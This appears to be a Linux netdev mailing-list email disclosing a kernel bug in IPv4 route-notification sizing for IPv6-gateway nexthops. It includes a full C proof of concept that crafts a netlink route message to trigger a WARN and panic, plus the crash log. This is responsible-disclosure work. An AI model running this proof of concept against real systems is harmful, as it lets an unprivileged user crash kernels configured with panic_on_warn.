Received: from mail-pj1-f42.google.com (mail-pj1-f42.google.com [209.85.216.42])
	(using TLSv1.2 with cipher ECDHE-RSA-AES128-GCM-SHA256 (128/128 bits))
	(No client certificate requested)
	by smtp.subspace.kernel.org (Postfix) with ESMTPS id E2FED42D76A
	for <netdev@vger.kernel.org>; Mon, 27 Jul 2026 18:14:26 +0000 (UTC)
Authentication-Results: smtp.subspace.kernel.org; arc=none smtp.client-ip=209.85.216.42
ARC-Seal:i=1; a=rsa-sha256; d=subspace.kernel.org; s=arc-20240116;
	t=1785176069; cv=none; b=fHO7qV1wztySGg+a1EnEU8V6Qd1vXzeOqH/vYGHSw7rn4pI3rO0QbBglQlGwfniMGfUH3koWwyS37zkSva10DoSHHEnPV5BgN91Y9yd1AXaLQqljMxJ+dB3Z2N2j1AAmDcvK1egpKulKqcrziYI3FmAYBA/zk2TGK81dsPVyDHI=
ARC-Message-Signature:i=1; a=rsa-sha256; d=subspace.kernel.org;
	s=arc-20240116; t=1785176069; c=relaxed/simple;
	bh=qvznqvMAyi5kq+648WCVbGMOOl0OaUExcL57zYMLlDM=;
	h=From:To:Cc:Subject:Date:Message-ID:MIME-Version; b=up+u7dz3A8lXSQQ/G5XAaklstsO8w/pPQF2LObQWcFwAt8H7lmBNGQmPm7ICIzWDz6XEG5uB+Bu6zTiNR8o9DHjVPMz5Qibx6hCf2qkGfy9v5fTIsQzQ8PBcZgQ9gdjs1FT09XiG0an/E5AXU8ky+74Qey1Vnnw5KX9tGOwN7oI=
ARC-Authentication-Results:i=1; smtp.subspace.kernel.org; dmarc=pass (p=none dis=none) header.from=gmail.com; spf=pass smtp.mailfrom=gmail.com; dkim=pass (2048-bit key) header.d=gmail.com header.i=@gmail.com header.b=AbzDfCYr; arc=none smtp.client-ip=209.85.216.42
Authentication-Results: smtp.subspace.kernel.org; dmarc=pass (p=none dis=none) header.from=gmail.com
Authentication-Results: smtp.subspace.kernel.org; spf=pass smtp.mailfrom=gmail.com
Authentication-Results: smtp.subspace.kernel.org;
	dkim=pass (2048-bit key) header.d=gmail.com header.i=@gmail.com header.b="AbzDfCYr"
Received: by mail-pj1-f42.google.com with SMTP id 98e67ed59e1d1-38511175ad3so2056419a91.2
        for <netdev@vger.kernel.org>; Mon, 27 Jul 2026 11:14:26 -0700 (PDT)
DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed;
        d=gmail.com; s=20251104; t=1785176066; x=1785780866; darn=vger.kernel.org;
        h=content-transfer-encoding:mime-version:message-id:date:subject:cc
         :to:from:from:to:cc:subject:date:message-id:reply-to:content-type;
        bh=9bZTri9E1C1/dnoRCPU+8yJ9q/H5w6U2S1KzBPGFltc=;
        b=AbzDfCYrEuK0D9VG7jITOoNl3Shi43Pvrzn/KVWTdpRfjEJB0bLjJ8AK7G8PeT5iXl
         gbzAYQ2sVIu7x1LXubZ+87NuMT7rIK7VrmzPT3EjeRbMwGpHaYiAqrUGldYcShyik6T8
         /lDjUWKrTq36fe8AlSL9PYWtQCXm4I4Uv/L48WXYY7sMQcUWw3TzvA3mjhGPC+Fvmuyd
         ipPLyzy5nE/8iP1nZ8Yf19rYm7pksPgysBustj6ciMhbT69+CguK1h5vZTUT2PS4U3OQ
         OzvpqlnYjBkIGy4VGaElCYQGJDUhiWqC5i1Ba6pm8FG8l6Tt00pfrsgfV+Ch6azOx+0P
         B/yA==
X-Google-DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed;
        d=1e100.net; s=20251104; t=1785176066; x=1785780866;
        h=content-transfer-encoding:mime-version:message-id:date:subject:cc
         :to:from:x-gm-gg:x-gm-message-state:from:to:cc:subject:date
         :message-id:reply-to:content-type;
        bh=9bZTri9E1C1/dnoRCPU+8yJ9q/H5w6U2S1KzBPGFltc=;
        b=r7dMb2kvbNIVVMbySQPOHa00JH6QJUnwA9T+FRJ+1AuomEOr7/2LG7HR79ueqx42n5
         3P0UarkyWprxUCtLWgD3aT1lQ716ocWCZLQ97aZu92jL4ScLKydMmf/ib7Mj7yrvndni
         eCFfYpChDZOugGDqLOTt1syoP0jtnIRCnFptv4h7afnlrF3vBjqIkVPkwL1q/DsMPUYf
         FIUnACKWD+/3LhbGG/5UnzmMr/88dTZKdIjbd4PbvqFMo2s1aBms7r3JsOzGo+ymz+Ca
         wXsgMEInJOVvnv+N1ZC/wLzddj9txk9ZFW+eZ/Qn0ZRBO80PWXjwlZW8zLy1UvKeTAKk
         X/QA==
X-Gm-Message-State: AOJu0YwdG2kgUHh+98HbBSvdsqOdXgPoy2ak65edAhyA8/aAsoHWACg+
	usJB7x+9Pe6xN4a6cs5r2II+ipM79LZ4qSL7tWV9DMtpbuQnc16gA2LXh+hdDYvcTjfMVg==
X-Gm-Gg: AR+sD11LxD8EHPFUOu8Zjrx9B+X6Iqr0AqYsjCxCJOYDKdnzcbHOoLwGGE/fyMKGk4j
	euzF/02tBqBB0/JJsu+hPR6u9D5+DYonDxABGhm2O8/DLPlfQEW4zJrBrNU/bWKq0S9hZt9x6z3
	wXwLpklqQVtGS/Kkr6LPIpIC8yq8lTG35A2ZQyB1fTutZPr6z8ccr02zA78rx/CoASfI2mpk/H0
	WDVEHBPGCPnNDAzUiCkBawJQWsUQgTRNyjSHqjWroBYnt1ovQA2Z13gA0dHHhljmiM9H6X9jMZ4
	9ybzD49QYbwq+Ta5vkGKLSUFI6AcT1/j9x0VAgbuNJDJSHM+nW+NRR9+uydUehT4sG9x4ONWGFz
	85EuUd/w1n0c01L9aTBOKIDCc4fH6/zcFpPKnF/v0wE7b3QMxVKZA9+hVjTzLt9RPa3gNNe1Gyu
	KFnmOYW1zDk2dj9WbxCSuq
X-Received: by 2002:a17:90b:548b:b0:38e:712a:bb38 with SMTP id 98e67ed59e1d1-38f64cc9e36mr281137a91.24.1785176065678;
        Mon, 27 Jul 2026 11:14:25 -0700 (PDT)
Received: from enjou-Legion-Y7000P-2019 ([219.141.235.82])
        by smtp.gmail.com with ESMTPSA id 98e67ed59e1d1-38f6413fe85sm199851a91.12.2026.07.27.11.14.22
        (version=TLS1_3 cipher=TLS_AES_256_GCM_SHA384 bits=256/256);
        Mon, 27 Jul 2026 11:14:25 -0700 (PDT)
From: Ren Wei <enjou1224z@gmail.com>
To: netdev@vger.kernel.org
Cc: dsahern@kernel.org,
	idosch@nvidia.com,
	davem@davemloft.net,
	edumazet@google.com,
	pabeni@redhat.com,
	horms@kernel.org,
	vega@nebusec.ai,
	zihanx@nebusec.ai,
	enjou1224z@gmail.com
Subject: [PATCH net 0/1] ipv4: Fix fib_nlmsg_size() for RTA_VIA nexthops
Date: Tue, 28 Jul 2026 02:14:19 +0800
Message-ID: <cover.1785058094.git.zihanx@nebusec.ai>
X-Mailer: git-send-email 2.51.0
Precedence: bulk
X-Mailing-List: netdev@vger.kernel.org
List-Id: <netdev.vger.kernel.org>
List-Subscribe: <mailto:netdev+subscribe@vger.kernel.org>
List-Unsubscribe: <mailto:netdev+unsubscribe@vger.kernel.org>
MIME-Version: 1.0
Content-Transfer-Encoding: 8bit

From: Zihan Xi <zihanx@nebusec.ai>

Hi Linux kernel maintainers,

We found and validated a issue in net/ipv4/fib_semantics.c. The bug is reachable by a
non-root user via user and net namespace.
We've tested it, and it should not affect any other functionality.

We will provide detailed information about the bug
in this email, along with a PoC to trigger it.

---- details below ----

Bug details:

fib_nlmsg_size() is used to allocate the skb for IPv4 route notifications
before fib_dump_info() serializes the route. The size calculation did not
match the attributes emitted for IPv4 routes with IPv6 nexthop gateways.

When the gateway family differs from the IPv4 route family,
fib_nexthop_info() emits the gateway as RTA_VIA, but fib_nlmsg_size()
still charged only a 4-byte RTA_GATEWAY-style attribute. For multipath
routes it also charged each struct rtnexthop as a standalone nlattr even
though fib_add_nexthop() writes it with nla_reserve_nohdr(), and it
charged RTA_FLOW unconditionally. With enough RTA_VIA nexthops, the
undercount makes fib_dump_info() return -EMSGSIZE and rtmsg_fib() reaches
the WARN_ON() that treats -EMSGSIZE as a fib_nlmsg_size() bug. In a
panic_on_warn kernel this panics the machine.

The fix adds a helper for the per-nexthop dump size and uses the same
attribute layout as fib_nexthop_info() and fib_add_nexthop(): RTA_VIA is
charged when the gateway family differs from the route family, the
multipath rtnexthop header is charged without an nlattr header, and
RTA_FLOW is charged only when it is actually present.

Fixes selection:

The generic notification path already existed, but IPv4 routes could not
carry IPv6 gateways until commit d15662682db2 ("ipv4: Allow ipv6 gateway
with ipv4 routes"). That commit added the current RTA_VIA dump path and
made this undercount reachable, so it is used as Fixes.

------BEGIN poc.c------

#define _GNU_SOURCE

#include <arpa/inet.h>
#include <errno.h>
#include <linux/netlink.h>
#include <linux/rtnetlink.h>
#include <net/if.h>
#include <stdbool.h>
#include <stdint.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/socket.h>
#include <sys/types.h>
#include <unistd.h>

#define DEST_PREFIX "198.51.100.0"
#define PREFSRC_ADDR "192.0.2.254"
#define VIA_PREFIX "2001:db8::"
#define ROUTE_METRIC 123U
#define BUF_SIZE 65536

struct req {
	struct nlmsghdr nlh;
	struct rtmsg rtm;
	char buf[BUF_SIZE];
};

static void die(const char *msg)
{
	perror(msg);
	exit(EXIT_FAILURE);
}

static void *buf_nlmsg_tail(void *buf, const struct nlmsghdr *nlh)
{
	return (void *)((char *)buf + NLMSG_ALIGN(nlh->nlmsg_len));
}

static int nlmsg_addattr(void *buf, struct nlmsghdr *nlh, size_t maxlen,
			 uint16_t type,
			 const void *data, size_t len)
{
	size_t attr_len = RTA_LENGTH(len);
	size_t total = NLMSG_ALIGN(nlh->nlmsg_len) + RTA_ALIGN(attr_len);
	struct rtattr *rta;

	if (total > maxlen)
		return -1;

	rta = buf_nlmsg_tail(buf, nlh);
	rta->rta_type = type;
	rta->rta_len = attr_len;
	if (len && data)
		memcpy(RTA_DATA(rta), data, len);
	nlh->nlmsg_len = total;
	return 0;
}

static struct rtattr *nlmsg_nest_start(void *buf, struct nlmsghdr *nlh,
				       size_t maxlen, uint16_t type)
{
	struct rtattr *nest = buf_nlmsg_tail(buf, nlh);

	if (nlmsg_addattr(buf, nlh, maxlen, type, NULL, 0) < 0)
		return NULL;
	return nest;
}

static void nlmsg_nest_end(void *buf, struct nlmsghdr *nlh, struct rtattr *nest)
{
	nest->rta_len = (char *)buf_nlmsg_tail(buf, nlh) - (char *)nest;
}

static int rtnh_addattr(void *buf, struct nlmsghdr *nlh, size_t maxlen,
			struct rtnexthop *rtnh, uint16_t type,
			const void *data, size_t len)
{
	size_t attr_len = RTA_LENGTH(len);
	size_t total = NLMSG_ALIGN(nlh->nlmsg_len) + RTA_ALIGN(attr_len);
	struct rtattr *rta;

	if (total > maxlen)
		return -1;

	rta = buf_nlmsg_tail(buf, nlh);
	rta->rta_type = type;
	rta->rta_len = attr_len;
	if (len && data)
		memcpy(RTA_DATA(rta), data, len);

	nlh->nlmsg_len = total;
	rtnh->rtnh_len += RTA_ALIGN(attr_len);
	return 0;
}

static int add_metric(void *buf, struct rtattr **metrics, struct nlmsghdr *nlh,
		      size_t maxlen, uint16_t type, const void *data, size_t len)
{
	if (!*metrics) {
		*metrics = nlmsg_nest_start(buf, nlh, maxlen, RTA_METRICS);
		if (!*metrics)
			return -1;
	}

	return nlmsg_addattr(buf, nlh, maxlen, type, data, len);
}

static int add_metrics(void *buf, struct nlmsghdr *nlh, size_t maxlen)
{
	struct rtattr *metrics = NULL;
	uint32_t one = 1;
	uint32_t mtu = 1400;
	uint32_t advmss = 1200;
	uint32_t cwnd = 10;
	uint32_t features = 1;
	const char cc_algo[] = "reno";

	if (add_metric(buf, &metrics, nlh, maxlen, RTAX_LOCK, &one, sizeof(one)) < 0)
		return -1;
	if (add_metric(buf, &metrics, nlh, maxlen, RTAX_MTU, &mtu, sizeof(mtu)) < 0)
		return -1;
	if (add_metric(buf, &metrics, nlh, maxlen, RTAX_WINDOW, &one, sizeof(one)) < 0)
		return -1;
	if (add_metric(buf, &metrics, nlh, maxlen, RTAX_RTT, &one, sizeof(one)) < 0)
		return -1;
	if (add_metric(buf, &metrics, nlh, maxlen, RTAX_RTTVAR, &one, sizeof(one)) < 0)
		return -1;
	if (add_metric(buf, &metrics, nlh, maxlen, RTAX_SSTHRESH, &one, sizeof(one)) < 0)
		return -1;
	if (add_metric(buf, &metrics, nlh, maxlen, RTAX_CWND, &cwnd, sizeof(cwnd)) < 0)
		return -1;
	if (add_metric(buf, &metrics, nlh, maxlen, RTAX_ADVMSS, &advmss, sizeof(advmss)) < 0)
		return -1;
	if (add_metric(buf, &metrics, nlh, maxlen, RTAX_REORDERING, &one, sizeof(one)) < 0)
		return -1;
	if (add_metric(buf, &metrics, nlh, maxlen, RTAX_HOPLIMIT, &one, sizeof(one)) < 0)
		return -1;
	if (add_metric(buf, &metrics, nlh, maxlen, RTAX_INITCWND, &cwnd, sizeof(cwnd)) < 0)
		return -1;
	if (add_metric(buf, &metrics, nlh, maxlen, RTAX_FEATURES, &features, sizeof(features)) < 0)
		return -1;
	if (add_metric(buf, &metrics, nlh, maxlen, RTAX_RTO_MIN, &one, sizeof(one)) < 0)
		return -1;
	if (add_metric(buf, &metrics, nlh, maxlen, RTAX_INITRWND, &cwnd, sizeof(cwnd)) < 0)
		return -1;
	if (add_metric(buf, &metrics, nlh, maxlen, RTAX_QUICKACK, &one, sizeof(one)) < 0)
		return -1;
	if (add_metric(buf, &metrics, nlh, maxlen, RTAX_CC_ALGO, cc_algo, sizeof(cc_algo)) < 0)
		return -1;
	if (add_metric(buf, &metrics, nlh, maxlen, RTAX_FASTOPEN_NO_COOKIE, &one,
		       sizeof(one)) < 0)
		return -1;

	if (metrics)
		nlmsg_nest_end(buf, nlh, metrics);
	return 0;
}

static int build_route(struct req *req, size_t maxlen, unsigned int nh_count,
		       int ifindex, bool with_flow)
{
	struct in_addr dst;
	struct in_addr prefsrc;
	uint32_t table = RT_TABLE_MAIN;
	uint32_t priority = ROUTE_METRIC;
	struct rtattr *multipath;
	unsigned int i;

	memset(req, 0, sizeof(*req));

	req->nlh.nlmsg_len = NLMSG_LENGTH(sizeof(req->rtm));
	req->nlh.nlmsg_type = RTM_NEWROUTE;
	req->nlh.nlmsg_flags = NLM_F_REQUEST | NLM_F_ACK | NLM_F_CREATE | NLM_F_EXCL;
	req->nlh.nlmsg_seq = 1;

	req->rtm.rtm_family = AF_INET;
	req->rtm.rtm_dst_len = 24;
	req->rtm.rtm_table = RT_TABLE_MAIN;
	req->rtm.rtm_protocol = RTPROT_BOOT;
	req->rtm.rtm_scope = RT_SCOPE_UNIVERSE;
	req->rtm.rtm_type = RTN_UNICAST;

	if (inet_pton(AF_INET, DEST_PREFIX, &dst) != 1) {
		errno = EINVAL;
		return -1;
	}
	if (inet_pton(AF_INET, PREFSRC_ADDR, &prefsrc) != 1) {
		errno = EINVAL;
		return -1;
	}

	if (nlmsg_addattr(req, &req->nlh, maxlen, RTA_TABLE, &table, sizeof(table)) < 0)
		return -1;
	if (nlmsg_addattr(req, &req->nlh, maxlen, RTA_DST, &dst, sizeof(dst)) < 0)
		return -1;
	if (nlmsg_addattr(req, &req->nlh, maxlen, RTA_PRIORITY, &priority,
			  sizeof(priority)) < 0)
		return -1;
	if (nlmsg_addattr(req, &req->nlh, maxlen, RTA_PREFSRC, &prefsrc,
			  sizeof(prefsrc)) < 0)
		return -1;
	if (add_metrics(req, &req->nlh, maxlen) < 0)
		return -1;

	multipath = nlmsg_nest_start(req, &req->nlh, maxlen, RTA_MULTIPATH);
	if (!multipath)
		return -1;

	for (i = 1; i <= nh_count; i++) {
		struct rtnexthop *rtnh;
		struct in6_addr gw6;
		char addrbuf[sizeof("2001:db8::") + 10];
		unsigned char via[2 + sizeof(gw6)];

		if ((size_t)((char *)buf_nlmsg_tail(req, &req->nlh) - (char *)req) +
		    NLMSG_ALIGN(sizeof(*rtnh)) > maxlen) {
			errno = ENOSPC;
			return -1;
		}

		rtnh = buf_nlmsg_tail(req, &req->nlh);
		memset(rtnh, 0, sizeof(*rtnh));
		rtnh->rtnh_len = sizeof(*rtnh);
		rtnh->rtnh_flags = RTNH_F_ONLINK;
		rtnh->rtnh_hops = 0;
		rtnh->rtnh_ifindex = ifindex;
		req->nlh.nlmsg_len = NLMSG_ALIGN(req->nlh.nlmsg_len) +
				     NLMSG_ALIGN(sizeof(*rtnh));

		snprintf(addrbuf, sizeof(addrbuf), VIA_PREFIX "%x", i);
		if (inet_pton(AF_INET6, addrbuf, &gw6) != 1) {
			errno = EINVAL;
			return -1;
		}

		memset(via, 0, sizeof(via));
		via[0] = AF_INET6 & 0xff;
		via[1] = (AF_INET6 >> 8) & 0xff;
		memcpy(via + 2, &gw6, sizeof(gw6));

		if (rtnh_addattr(req, &req->nlh, maxlen, rtnh, RTA_VIA, via,
				 sizeof(via)) < 0)
			return -1;

		if (with_flow) {
			uint32_t flow = i;

			if (rtnh_addattr(req, &req->nlh, maxlen, rtnh, RTA_FLOW, &flow,
					 sizeof(flow)) < 0)
				return -1;
		}
	}

	nlmsg_nest_end(req, &req->nlh, multipath);
	return 0;
}

static int send_netlink_req(int fd, struct nlmsghdr *nlh)
{
	struct sockaddr_nl nladdr = {
		.nl_family = AF_NETLINK,
	};
	struct iovec iov = {
		.iov_base = nlh,
		.iov_len = nlh->nlmsg_len,
	};
	struct msghdr msg = {
		.msg_name = &nladdr,
		.msg_namelen = sizeof(nladdr),
		.msg_iov = &iov,
		.msg_iovlen = 1,
	};
	char ackbuf[8192];
	struct iovec ack_iov = {
		.iov_base = ackbuf,
		.iov_len = sizeof(ackbuf),
	};
	struct msghdr ack_msg = {
		.msg_name = &nladdr,
		.msg_namelen = sizeof(nladdr),
		.msg_iov = &ack_iov,
		.msg_iovlen = 1,
	};
	struct nlmsghdr *h;
	ssize_t len;

	if (sendmsg(fd, &msg, 0) < 0)
		return -1;

	len = recvmsg(fd, &ack_msg, 0);
	if (len < 0)
		return -1;

	for (h = (struct nlmsghdr *)ackbuf; NLMSG_OK(h, (unsigned int)len);
	     h = NLMSG_NEXT(h, len)) {
		if (h->nlmsg_type == NLMSG_ERROR) {
			struct nlmsgerr *err = NLMSG_DATA(h);

			if (err->error) {
				errno = -err->error;
				return -1;
			}
			return 0;
		}
	}

	errno = EPROTO;
	return -1;
}

static int delete_route(int fd)
{
	struct {
		struct nlmsghdr nlh;
		struct rtmsg rtm;
		char buf[128];
	} req = {
		.nlh = {
			.nlmsg_len = NLMSG_LENGTH(sizeof(struct rtmsg)),
			.nlmsg_type = RTM_DELROUTE,
			.nlmsg_flags = NLM_F_REQUEST | NLM_F_ACK,
			.nlmsg_seq = 2,
		},
		.rtm = {
			.rtm_family = AF_INET,
			.rtm_dst_len = 24,
			.rtm_table = RT_TABLE_MAIN,
			.rtm_protocol = RTPROT_BOOT,
			.rtm_scope = RT_SCOPE_UNIVERSE,
			.rtm_type = RTN_UNICAST,
		},
	};
	struct in_addr dst;
	uint32_t table = RT_TABLE_MAIN;

	if (inet_pton(AF_INET, DEST_PREFIX, &dst) != 1)
		return -1;
	if (nlmsg_addattr(&req, &req.nlh, sizeof(req), RTA_TABLE, &table, sizeof(table)) < 0)
		return -1;
	if (nlmsg_addattr(&req, &req.nlh, sizeof(req), RTA_DST, &dst, sizeof(dst)) < 0)
		return -1;

	if (send_netlink_req(fd, &req.nlh) < 0) {
		if (errno == ESRCH)
			return 0;
		return -1;
	}

	return 0;
}

int main(int argc, char **argv)
{
	struct req *req;
	unsigned int nh_count = 128;
	const char *ifname = "dummy0";
	bool with_flow = true;
	int ifindex;
	int fd;

	if (argc > 1)
		nh_count = strtoul(argv[1], NULL, 0);
	if (argc > 2)
		ifname = argv[2];
	if (argc > 3)
		with_flow = strcmp(argv[3], "noflow") != 0;

	ifindex = if_nametoindex(ifname);
	if (!ifindex) {
		fprintf(stderr, "interface %s not found\n", ifname);
		return EXIT_FAILURE;
	}

	req = calloc(1, sizeof(*req));
	if (!req)
		die("calloc");

	if (build_route(req, sizeof(*req), nh_count, ifindex, with_flow) < 0)
		die("build_route");

	fd = socket(AF_NETLINK, SOCK_RAW, NETLINK_ROUTE);
	if (fd < 0)
		die("socket");

	if (delete_route(fd) < 0)
		die("delete_route");

	if (send_netlink_req(fd, &req->nlh) < 0)
		die("send_netlink_req");

	printf("added route with %u nexthops on %s (%s flow attr)\n",
	       nh_count, ifname, with_flow ? "with" : "without");

	close(fd);
	free(req);
	return 0;
}

------END poc.c--------

----BEGIN crash log----

[   15.788149] ------------[ cut here ]------------
[   15.798564] WARNING: net/ipv4/fib_semantics.c:566 at rtmsg_fib+0x193/0x1a0, CPU#1: poc/259
[   15.819396] Modules linked in:
[   15.826740] CPU: 1 UID: 1001 PID: 259 Comm: poc Not tainted 7.2.0-rc4-00389-g53658c6f3682 #4 PREEMPT(lazy) 
[   15.847330] Hardware name: QEMU Ubuntu 24.04 PC v2 (i440FX + PIIX, arch_caps fix, 1996), BIOS 1.16.3-debian-1.16.3-2 04/01/2014
[   15.875102] RIP: 0010:rtmsg_fib (net/ipv4/fib_semantics.c:566 (discriminator 1))
[   15.886524] Code: 74 01 75 2b 48 8b 7d 08 48 83 c4 30 89 da be 07 00 00 00 5b 5d 41 5c 41 5d 41 5e 41 5f e9 25 23 ee ff bb 97 ff ff ff eb cc 90 <0f> 0b 90 eb b7 e8 33 64 26 00 0f 1f 00 90 90 90 90 90 90 90 90 90
All code
========
   0:	74 01                	je     0x3
   2:	75 2b                	jne    0x2f
   4:	48 8b 7d 08          	mov    0x8(%rbp),%rdi
   8:	48 83 c4 30          	add    $0x30,%rsp
   c:	89 da                	mov    %ebx,%edx
   e:	be 07 00 00 00       	mov    $0x7,%esi
  13:	5b                   	pop    %rbx
  14:	5d                   	pop    %rbp
  15:	41 5c                	pop    %r12
  17:	41 5d                	pop    %r13
  19:	41 5e                	pop    %r14
  1b:	41 5f                	pop    %r15
  1d:	e9 25 23 ee ff       	jmp    0xffffffffffee2347
  22:	bb 97 ff ff ff       	mov    $0xffffff97,%ebx
  27:	eb cc                	jmp    0xfffffffffffffff5
  29:	90                   	nop
  2a:*	0f 0b                	ud2		<-- trapping instruction
  2c:	90                   	nop
  2d:	eb b7                	jmp    0xffffffffffffffe6
  2f:	e8 33 64 26 00       	call   0x266467
  34:	0f 1f 00             	nopl   (%rax)
  37:	90                   	nop
  38:	90                   	nop
  39:	90                   	nop
  3a:	90                   	nop
  3b:	90                   	nop
  3c:	90                   	nop
  3d:	90                   	nop
  3e:	90                   	nop
  3f:	90                   	nop

Code starting with the faulting instruction
===========================================
   0:	0f 0b                	ud2
   2:	90                   	nop
   3:	eb b7                	jmp    0xffffffffffffffbc
   5:	e8 33 64 26 00       	call   0x26643d
   a:	0f 1f 00             	nopl   (%rax)
   d:	90                   	nop
   e:	90                   	nop
   f:	90                   	nop
  10:	90                   	nop
  11:	90                   	nop
  12:	90                   	nop
  13:	90                   	nop
  14:	90                   	nop
  15:	90                   	nop
[   15.929053] RSP: 0018:ffff97d00034b8a0 EFLAGS: 00010246
[   15.940737] RAX: 00000000ffffffa6 RBX: 00000000ffffffa6 RCX: ffff97d00034b7fb
[   15.956222] RDX: 0000000000000000 RSI: 0000000000000000 RDI: ffff9523038c53c0
[   15.973048] RBP: ffff97d00034ba48 R08: 0000000000000001 R09: ffff95230cf03eb0
[   15.989402] R10: ffffffffaa44dde0 R11: fefefefefefefeff R12: 0000000000000018
[   16.004914] R13: 00000000006433c6 R14: 00000000000000fe R15: 0000000000000001
[   16.019329] FS:  00007fb9dd727540(0000) GS:ffff9523d2f6c000(0000) knlGS:0000000000000000
[   16.037578] CS:  0010 DS: 0000 ES: 0000 CR0: 0000000080050033
[   16.050053] CR2: 00007ffd32666f40 CR3: 000000000b7d7001 CR4: 0000000000370ef0
[   16.064929] Call Trace:
[   16.070054]  <TASK>
[   16.074596]  fib_table_insert (net/ipv4/fib_trie.c:1380 (discriminator 1))
[   16.083900]  ? msi_set_affinity (arch/x86/kernel/apic/msi.c:37 (discriminator 1))
[   16.092900]  ? arch_stack_walk (arch/x86/kernel/stacktrace.c:26)
[   16.101235]  ? inet_rtm_newroute (net/ipv4/fib_frontend.c:931)
[   16.110591]  inet_rtm_newroute (net/ipv4/fib_frontend.c:931)
[   16.118640]  ? __pfx_inet_rtm_newroute (net/ipv4/fib_frontend.c:909)
[   16.128504]  rtnetlink_rcv_msg (net/core/rtnetlink.c:7076)
[   16.136524]  ? __alloc_skb (net/core/skbuff.c:715)
[   16.144368]  ? ___slab_alloc (mm/slub.c:1080 mm/slub.c:4524)
[   16.156445]  ? avc_has_perm (include/linux/rcupdate.h:873 security/selinux/avc.c:1165 security/selinux/avc.c:1195)
[   16.165362]  ? __pfx_rtnetlink_rcv_msg (net/core/rtnetlink.c:4441)
[   16.178514]  netlink_rcv_skb (net/netlink/af_netlink.c:2556)
[   16.186128]  netlink_unicast (net/netlink/af_netlink.c:1319 net/netlink/af_netlink.c:1345)
[   16.194378]  netlink_sendmsg (net/netlink/af_netlink.c:1900)
[   16.202745]  ____sys_sendmsg (net/socket.c:775 (discriminator 1) net/socket.c:790 (discriminator 1) net/socket.c:2684 (discriminator 1))
[   16.210082]  ___sys_sendmsg (net/socket.c:2738)
[   16.219513]  __sys_sendmsg (net/socket.c:2770)
[   16.227224]  do_syscall_64 (arch/x86/entry/syscall_64.c:63 arch/x86/entry/syscall_64.c:94)
[   16.235472]  entry_SYSCALL_64_after_hwframe (arch/x86/entry/entry_64.S:121)
[   16.249707] RIP: 0033:0x7fb9dd64efa3
[   16.257622] Code: 64 89 02 48 c7 c0 ff ff ff ff eb b7 66 2e 0f 1f 84 00 00 00 00 00 90 64 8b 04 25 18 00 00 00 85 c0 75 14 b8 2e 00 00 00 0f 05 <48> 3d 00 f0 ff ff 77 55 c3 0f 1f 40 00 48 83 ec 28 89 54 24 1c 48
All code
========
   0:	64 89 02             	mov    %eax,%fs:(%rdx)
   3:	48 c7 c0 ff ff ff ff 	mov    $0xffffffffffffffff,%rax
   a:	eb b7                	jmp    0xffffffffffffffc3
   c:	66 2e 0f 1f 84 00 00 	cs nopw 0x0(%rax,%rax,1)
  13:	00 00 00 
  16:	90                   	nop
  17:	64 8b 04 25 18 00 00 	mov    %fs:0x18,%eax
  1e:	00 
  1f:	85 c0                	test   %eax,%eax
  21:	75 14                	jne    0x37
  23:	b8 2e 00 00 00       	mov    $0x2e,%eax
  28:	0f 05                	syscall
  2a:*	48 3d 00 f0 ff ff    	cmp    $0xfffffffffffff000,%rax		<-- trapping instruction
  30:	77 55                	ja     0x87
  32:	c3                   	ret
  33:	0f 1f 40 00          	nopl   0x0(%rax)
  37:	48 83 ec 28          	sub    $0x28,%rsp
  3b:	89 54 24 1c          	mov    %edx,0x1c(%rsp)
  3f:	48                   	rex.W

Code starting with the faulting instruction
===========================================
   0:	48 3d 00 f0 ff ff    	cmp    $0xfffffffffffff000,%rax
   6:	77 55                	ja     0x5d
   8:	c3                   	ret
   9:	0f 1f 40 00          	nopl   0x0(%rax)
   d:	48 83 ec 28          	sub    $0x28,%rsp
  11:	89 54 24 1c          	mov    %edx,0x1c(%rsp)
  15:	48                   	rex.W
[   16.297484] RSP: 002b:00007ffd326672f8 EFLAGS: 00000246 ORIG_RAX: 000000000000002e
[   16.311567] RAX: ffffffffffffffda RBX: 00007ffd326673b0 RCX: 00007fb9dd64efa3
[   16.325962] RDX: 0000000000000000 RSI: 00007ffd32667330 RDI: 0000000000000003
[   16.337955] RBP: 0000000000000003 R08: 0000000000000008 R09: 0000000000000004
[   16.351264] R10: fffffffffffff61f R11: 0000000000000246 R12: 00005563c1d7c2a0
[   16.363193] R13: 00005563c1d7c2a0 R14: 00007ffd32669430 R15: 0000000000000003
[   16.374980]  </TASK>
[   16.378237] Kernel panic - not syncing: kernel: panic_on_warn set ...
[   16.389681] CPU: 1 UID: 1001 PID: 259 Comm: poc Not tainted 7.2.0-rc4-00389-g53658c6f3682 #4 PREEMPT(lazy) 
[   16.406656] Hardware name: QEMU Ubuntu 24.04 PC v2 (i440FX + PIIX, arch_caps fix, 1996), BIOS 1.16.3-debian-1.16.3-2 04/01/2014
[   16.425849] Call Trace:
[   16.429194]  <TASK>
[   16.432527]  vpanic (kernel/panic.c:651)
[   16.438646]  ? rtmsg_fib (net/ipv4/fib_semantics.c:566 (discriminator 1))
[   16.444052]  panic (kernel/panic.c:788)
[   16.448363]  check_panic_on_warn (kernel/panic.c:525 kernel/panic.c:520)
[   16.455827]  __warn (kernel/panic.c:1104)
[   16.460334]  __report_bug (lib/bug.c:254)
[   16.466333]  ? rtmsg_fib (net/ipv4/fib_semantics.c:566 (discriminator 1))
[   16.472272]  ? ___slab_alloc (mm/slub.c:1080 mm/slub.c:4524)
[   16.480720]  ? entry_SYSCALL_64_after_hwframe (arch/x86/entry/entry_64.S:121)
[   16.490721]  ? rtmsg_fib (net/ipv4/fib_semantics.c:566 (discriminator 1))
[   16.500083]  report_bug (lib/bug.c:286)
[   16.512584]  handle_bug (arch/x86/kernel/traps.c:436)
[   16.519464]  exc_invalid_op (arch/x86/kernel/traps.c:490 (discriminator 1))
[   16.526285]  asm_exc_invalid_op (arch/x86/include/asm/idtentry.h:593)
[   16.534036] RIP: 0010:rtmsg_fib (net/ipv4/fib_semantics.c:566 (discriminator 1))
[   16.542081] Code: 74 01 75 2b 48 8b 7d 08 48 83 c4 30 89 da be 07 00 00 00 5b 5d 41 5c 41 5d 41 5e 41 5f e9 25 23 ee ff bb 97 ff ff ff eb cc 90 <0f> 0b 90 eb b7 e8 33 64 26 00 0f 1f 00 90 90 90 90 90 90 90 90 90
All code
========
   0:	74 01                	je     0x3
   2:	75 2b                	jne    0x2f
